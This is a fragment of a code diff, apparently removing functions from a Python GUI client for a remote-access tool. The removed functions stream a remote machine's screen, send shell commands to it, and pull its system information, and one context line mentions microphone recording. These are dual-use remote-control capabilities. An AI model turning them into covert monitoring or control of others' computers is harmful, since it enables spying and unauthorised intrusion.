-                print(f"Monitor error: {e}")
-                time.sleep(5)
-
-    def _update_dashboard(self, info):
-        """更新仪表盘数据"""
-        try:
-            # 更新系统信息
-            if 'platform' in info:
-                self.sys_info_labels['OS'].config(text=info.get('platform', 'N/A'))
-            if 'hostname' in info:
-                self.sys_info_labels['Hostname'].config(text=info.get('hostname', 'N/A'))
-            if 'ip_address' in info:
-                self.sys_info_labels['IP'].config(text=info.get('ip_address', 'N/A'))
-            if 'cpu_count' in info:
-                self.sys_info_labels['CPU Cores'].config(text=str(info.get('cpu_count', 'N/A')))
-
-            # 更新CPU
-            cpu_percent = info.get('cpu_percent', 0)
-            self._update_progress(self.cpu_progress, cpu_percent)
-            self.lbl_cpu.config(text=f"{cpu_percent:.1f}%")
-
-            # 更新内存
-            mem = info.get('memory', {})
-            mem_percent = mem.get('percent', 0)
-            mem_used = mem.get('used', 0) / (1024**3)  # 转换为GB
-            mem_total = mem.get('total', 0) / (1024**3)
-            self._update_progress(self.mem_progress, mem_percent)
-            self.lbl_mem.config(text=f"{mem_percent:.1f}% ({mem_used:.1f}/{mem_total:.1f} GB)")
-
-            # 更新磁盘
-            disk = info.get('disk', {})
-            disk_percent = disk.get('percent', 0)
-            disk_used = disk.get('used', 0) / (1024**3)
-            disk_total = disk.get('total', 0) / (1024**3)
-            self._update_progress(self.disk_progress, disk_percent)
-            self.lbl_disk.config(text=f"{disk_percent:.1f}% ({disk_used:.1f}/{disk_total:.1f} GB)")
-
-            # 更新其他信息
-            self.lbl_network.config(text=f"{info.get('network_connections', 0)} Active")
-            self.lbl_processes.config(text=f"{info.get('process_count', 0)} Processes")
-
-            # 运行时间
-            uptime = info.get('uptime', 0)
-            days = uptime // 86400
-            hours = (uptime % 86400) // 3600
-            minutes = (uptime % 3600) // 60
-            self.lbl_uptime.config(text=f"{days}d {hours}h {minutes}m")
-
-            # 日志
-            self.log_to_dashboard(f"System stats updated - CPU: {cpu_percent:.1f}% | MEM: {mem_percent:.1f}%")
-        except Exception as e:
-            print(f"Update dashboard error: {e}")
-
-    def _update_progress(self, canvas, percent):
-        """更新进度条"""
-        width = canvas.winfo_width()
-        if width <= 1:
-            width = 400  # 默认宽度
-        fill_width = (width * percent) / 100
-        canvas.coords(canvas.bar, 0, 0, fill_width, 20)
-
-        # 根据百分比改变颜色
-        if percent < 60:
-            color = COLORS['fg_success']
-        elif percent < 80:
-            color = COLORS['fg_warning']
-        else:
-            color = COLORS['fg_danger']
-        canvas.itemconfig(canvas.bar, fill=color)
-
-    def log_to_dashboard(self, msg):
-        """写入仪表盘日志"""
-        try:
-            timestamp = datetime.now().strftime("[%H:%M:%S]")
-            self.log_dashboard.insert(tk.END, f"{timestamp} {msg}\n")
-            self.log_dashboard.see(tk.END)
-        except:
-            pass
-
-    # ==================== 屏幕监控功能 ====================
-
-    def start_screen_stream(self):
-        """开始屏幕流"""
-        if self.streaming:
-            return
-
-        quality = self.quality_scale.get()
-
-        with self.sock_lock:
-            send_message(self.sock, create_screen_start_message(fps=10, quality=quality))
-
-        self.streaming = True
-        self.btn_start_stream.config(state='disabled')
-        self.btn_stop_stream.config(state='normal')
-
-        threading.Thread(target=self._screen_stream_loop, daemon=True).start()
-        self.add_history("Screen", "Started screen streaming", "Success")
-        self.log_to_dashboard("Screen streaming started")
-
-    def stop_screen_stream(self):
-        """停止屏幕流"""
-        self.streaming = False
-
-        with self.sock_lock:
-            send_message(self.sock, create_screen_stop_message())
-
-        self.screen_label.config(image='', text="Stream stopped\nClick START STREAM to resume")
-        self.btn_start_stream.config(state='normal')
-        self.btn_stop_stream.config(state='disabled')
-        self.add_history("Screen", "Stopped screen streaming", "Success")
-        self.log_to_dashboard("Screen streaming stopped")
-
-    def _screen_stream_loop(self):
-        """屏幕流接收循环"""
-        try:
-            # 接收开始响应
-            with self.sock_lock:
-                _ = receive_message(self.sock)
-
-            while self.streaming:
-                try:
-                    with self.sock_lock:
-                        msg = receive_message(self.sock)
-                        if not msg:
-                            break
-
-                        if msg['type'] == MessageType.SCREEN_FRAME:
-                            img_bytes = receive_binary_data(self.sock)
-                            if img_bytes:
-                                image = Image.open(io.BytesIO(img_bytes))
-                                # 缩放以适应标签页
-                                image.thumbnail((900, 500))
-                                photo = ImageTk.PhotoImage(image)
-
-                                if self.streaming:
-                                    self.after(0, lambda p=photo: self._update_screen_frame(p))
-                        elif msg['type'] == MessageType.SCREEN_STOP:
-                            break
-                except Exception as e:
-                    print(f"Stream frame error: {e}")
-                    break
-        except Exception as e:
-            print(f"Stream error: {e}")
-        finally:
-            self.streaming = False
-            self.after(0, lambda: self.btn_start_stream.config(state='normal'))
-            self.after(0, lambda: self.btn_stop_stream.config(state='disabled'))
-
-    def _update_screen_frame(self, photo):
-        """更新屏幕帧"""
-        try:
-            self.screen_label.configure(image=photo, text='')
-            self.screen_label.image = photo
-        except:
-            pass
-
-    def take_screenshot(self):
-        """截取屏幕截图"""
-        self.req_screenshot()
-
-    # ==================== Shell功能 ====================
-
-    def send_shell_command(self, event):
-        """发送Shell命令"""
-        cmd = self.shell_entry.get()
-        if not cmd:
-            return
-
-        self.shell_entry.delete(0, tk.END)
-        self.shell_text.insert(tk.END, f"{cmd}\n")
-
-        # 发送命令
-        with self.sock_lock:
-            send_message(self.sock, create_shell_message(cmd))
-
-        # 接收响应
-        threading.Thread(target=self._wait_shell_response, daemon=True).start()
-
-        self.add_history("Shell", f"Executed: {cmd}", "Success")
-
-    def _wait_shell_response(self):
-        """等待Shell响应"""
-        try:
-            with self.sock_lock:
-                resp = receive_message(self.sock)
-            if resp and resp['type'] == MessageType.SHELL_RESPONSE:
-                output = resp['data']['output']
-                self.after(0, lambda: self.shell_text.insert(tk.END, f"{output}\n> "))
-        except Exception as e:
-            print(f"Shell response error: {e}")
 
     # ==================== 快捷操作功能 ====================
 
@@ -693,35 +1014,6 @@ class VisualClientUI(tk.Tk):
                 except Exception as e:
                     print(f"Mic record error: {e}")
             threading.Thread(target=_thread, daemon=True).start()
-
-    def req_sys_info_full(self):
-        """请求完整系统信息"""
-        def _thread():
-            try:
-                with self.sock_lock:
-                    send_message(self.sock, create_system_info_message())
-                    msg = receive_message(self.sock)
-                    if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
-                        info = msg['data']['info']
-                        formatted = json.dumps(info, indent=2)
-
-                        # 显示在新窗口
-                        def show():
-                            viewer = tk.Toplevel(self)
-                            viewer.title("System Information")
-                            viewer.geometry("600x500")
-                            viewer.configure(bg=COLORS['bg_dark'])
-
-                            text = scrolledtext.ScrolledText(viewer, bg='black', fg=COLORS['fg_secondary'],
-                                                            font=FONTS['mono'])
-                            text.pack(fill='both', expand=True, padx=10, pady=10)
-                            text.insert(tk.END, formatted)
-
-                        self.after(0, show)
-                        self.add_history("System Info", "Retrieved full system info", "Success")
-            except Exception as e:
-                print(f"Sys info error: {e}")
-        threading.Thread(target=_thread, daemon=True).start()
 
     def _show_image(self, img_data, title="Image"):
         """显示图片"""
